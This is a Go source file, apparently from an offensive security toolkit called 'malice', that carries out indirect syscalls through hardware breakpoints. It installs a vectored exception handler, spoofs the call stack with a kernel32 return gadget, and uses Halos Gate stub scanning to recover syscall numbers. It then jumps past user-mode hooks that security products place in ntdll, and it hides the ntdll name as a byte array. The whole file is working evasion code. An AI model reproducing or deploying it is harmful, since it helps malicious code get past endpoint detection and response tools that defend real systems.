package hwsyscall

import (
	"bytes"
	"fmt"
	"unsafe"

	"github.com/redt1de/malice/pkg/callz"
	"github.com/redt1de/malice/pkg/callz/hash"
	"github.com/redt1de/malice/pkg/veh"
	"golang.org/x/sys/windows"
)

type HwSyscall struct {
	Name          string
	SysID         uint16
	ntFuncAddr    uintptr
	retGadgetAddr uintptr
	// proc          *darklib.UnLazyProc
	proc   *windows.LazyProc
	Config *callz.CallzConf
}

type HWCaller struct {
	c *callz.CallzConf
}

func New(opts ...callz.CallerOpt) *HWCaller {
	cf := &callz.CallzConf{
		Resolver: callz.SSN_MEM,
		Hasher:   hash.None,
	}
	for _, opt := range opts {
		opt(cf)
	}
	return &HWCaller{c: cf}
}

const (
	STACK_ARGS_LENGTH     = 8
	STACK_ARGS_RSP_OFFSET = 0x28
)

func (hw *HwSyscall) Call(ag ...uintptr) (uintptr, uintptr, error) {
	hand := windows.NewCallback(hw.handler)
	vh, _ := veh.New(hand)
	fmt.Printf("[+] VEH in place, handler Addr: 0x%x\n", hand)

	vh.SetBPLocal(hw.proc.Addr(), windows.CurrentThread())
	// vh.SetBPGlobal(hw.proc.Addr())
	fmt.Printf("[+] Set BP on %s(): 0x%x\n", hw.proc.Name, hw.proc.Addr())

	fmt.Printf("[!] Calling %s\n", hw.proc.Name)
	r1, r2, e := hw.proc.Call(ag...)
	vh.Kill()
	return r1, r2, e
}

func (h *HWCaller) NewProc(proc string) *HwSyscall {
	ret := &HwSyscall{
		Name:   proc,
		Config: h.c,
	}
	// ret.proc = darklib.New(callz.WithConfig(h.c)).NotLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})).NewProc(proc)
	ret.proc = windows.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'})).NewProc(proc)
	ret.retGadgetAddr = findRetGadget()
	ret.ntFuncAddr = ret.proc.Addr()
	return ret
}

//go:nosplit
func (hw *HwSyscall) handler(e *veh.EXCEPTION_POINTERS) uintptr {
	if e.ExceptionRecord.ExceptionCode == veh.EXCEPTION_SINGLE_STEP {
		if e.ContextRecord.Rip == uint64(hw.ntFuncAddr) {
			//println("[+] NTAPI Function Breakpoint Hit")
			// HwSyscall sets this back to PrepareSyscall, but we are just gonna remove it for now
			e.ContextRecord.Dr0 = 0
			e.ContextRecord.Dr7 = veh.SetBits(e.ContextRecord.Dr7, 0, 1, 0)
			e.ContextRecord.Dr6 = 0
			e.ContextRecord.EFlags |= 0x10000

			// Create a new stack to spoof the kernel32 function address The stack size will be 0x70 which is compatible with the RET_GADGET we found.
			// sub rsp, 70
			e.ContextRecord.Rsp -= 0x70

			// mov rsp, RET_GADGET_ADDRESS
			*(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp))) = uint64(hw.retGadgetAddr)
			//println("[+] Created a new stack frame with retGadgetAddr as the return address")

			// // Copy the stack arguments from the original stack
			// STACK_ARGS_LENGTH     = 8
			// STACK_ARGS_RSP_OFFSET = 0x28
			var idx uint64
			for idx = 0; idx < STACK_ARGS_LENGTH; idx++ {
				offset := idx*STACK_ARGS_LENGTH + STACK_ARGS_RSP_OFFSET
				*(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp + offset))) = *(*uint64)(unsafe.Pointer(uintptr(e.ContextRecord.Rsp + offset + 0x70)))
			}
			//println("[+] Original stack arguments successfully copied over to the new stack")

			if !callz.IsHooked(uintptr(e.ContextRecord.Rip)) {
				//println("[+] function is not hooked, proceeding with normal execution")
			} else {
				//println("[!] function is hooked!")
				//println("[+] Looking for the SSN via Halos Gate")
				syscallNum := findSyscallNumber(uintptr(e.ContextRecord.Rip))
				syscallReturnAddress := findSyscallReturnAddress(uintptr(e.ContextRecord.Rip), syscallNum)

				// // mov r10, rcx
				//println("[+] Moving RCX to R10 (mov r10, rcx)")
				e.ContextRecord.R10 = e.ContextRecord.Rcx

				// //mov eax, SSN
				//println("[+] Moving SSN to RAX")
				e.ContextRecord.Rax = syscallNum
				// //Set RIP to syscall;ret; opcode address
				//println("[+] Jumping to \"syscall;ret;\" opcode address")
				e.ContextRecord.Rip = syscallReturnAddress

			}

		}
		return uintptr(veh.UEXCEPTION_CONTINUE_EXECUTION)
	}

	return uintptr(veh.EXCEPTION_CONTINUE_SEARCH)
}

func findRetGadget() uintptr {
	ret := callz.FindInModule("kernel32.dll", []byte{0x48, 0x83, 0xC4, 0x68, 0xC3})
	if ret == 0 {
		ret = callz.FindInModule("kernelbase.dll", []byte{0x48, 0x83, 0xC4, 0x68, 0xC3})
	}
	return ret
}

func findSyscallNumber(functionAddress uintptr) uint64 {
	//var HookCheck = []byte{0x4c, 0x8b, 0xd1, 0xb8}
	var syscallNumber uint64
	var idx uint64
	stbSz := uint64(32)

	for idx = 1; idx <= 500; idx++ {
		curStubUp := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress+uintptr(stbSz*idx))), stbSz)
		if curStubUp[0] == 0x4c && curStubUp[1] == 0x8b && curStubUp[2] == 0xd1 && curStubUp[3] == 0xb8 {
			syscallNumber = uint64(curStubUp[4]) - idx
			break
		}

		curStubDown := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress-uintptr(stbSz*idx))), stbSz)
		if curStubDown[0] == 0x4c && curStubDown[1] == 0x8b && curStubDown[2] == 0xd1 && curStubDown[3] == 0xb8 {
			syscallNumber = uint64(curStubDown[4]) + idx
			break
		}
	}

	if syscallNumber == 0 {
		//println("[-] Could not find SSN")

	}
	return uint64(syscallNumber)
}

func findSyscallReturnAddress(functionAddress uintptr, syscallNumber uint64) uint64 {
	var syscallReturnAddress uint64
	stbSz := uint64(32)
	curStub := unsafe.Slice((*byte)(unsafe.Pointer(functionAddress)), stbSz)
	ind := bytes.Index(curStub, []byte{0x0f, 0x05})
	syscallReturnAddress = uint64(functionAddress) + uint64(ind)

	if syscallReturnAddress == 0 {
		//println("[-] Could not find \"syscall;ret;\" opcode address")
	}

	return syscallReturnAddress
}
